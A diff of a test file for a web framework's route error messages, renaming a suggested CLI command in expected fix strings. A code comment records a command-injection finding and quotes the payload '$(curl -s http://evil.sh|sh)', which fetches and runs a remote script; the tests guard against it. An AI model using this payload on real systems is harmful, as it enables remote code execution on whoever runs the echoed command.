@@ -33,7 +33,7 @@ describe('routeNotFound', () => {
     expect(error.code).toBe('X_ROUTE_NOT_FOUND');
     expect(error.cause).toContain('GET');
     expect(error.cause).toContain('/x');
-    expect(error.fix).toBe('x routes list --json   # then: x g route /x');
+    expect(error.fix).toBe('x routes --json   # then: x g route /x');
     expect(error.docs).toBe(ERROR_DOCS_URL);
   });
 
@@ -41,7 +41,7 @@ describe('routeNotFound', () => {
    * The pathname is whatever an unauthenticated stranger typed, and the `fix:` is a line the
    * framework tells its reader to RUN. Reproduced against the shipped router:
    * `GET /$(curl -s http://evil.sh|sh)` rendered
-   * `fix: x routes list --json   # then: x g route /$(curl -s http://evil.sh|sh)`, command
+   * `fix: x routes --json   # then: x g route /$(curl -s http://evil.sh|sh)`, command
    * substitution and all, in the terminal of whoever pasted the error they were sent.
    */
   test('a hostile pathname never reaches the fix line, in any form', () => {
@@ -60,7 +60,7 @@ describe('routeNotFound', () => {
       expect(fix).not.toContain('`');
       // Still a command, and still one naming what to substitute — a fix that degraded to
       // nothing is a fix nobody can act on.
-      expect(fix).toContain('x routes list --json');
+      expect(fix).toContain('x routes --json');
       expect(fix).toContain('x g route ');
     }
   });
@@ -226,7 +226,7 @@ describe('routeConflict', () => {
     expect(error.cause).toContain('/posts/:id');
     expect(error.cause).toContain('GET /posts/:id already registered');
     expect(error.fix).toBe(
-      'x routes list --json   # remove or rename one of the two routes at /posts/:id',
+      'x routes --json   # remove or rename one of the two routes at /posts/:id',
     );
     expect(error.docs).toBe(ERROR_DOCS_URL);
   });
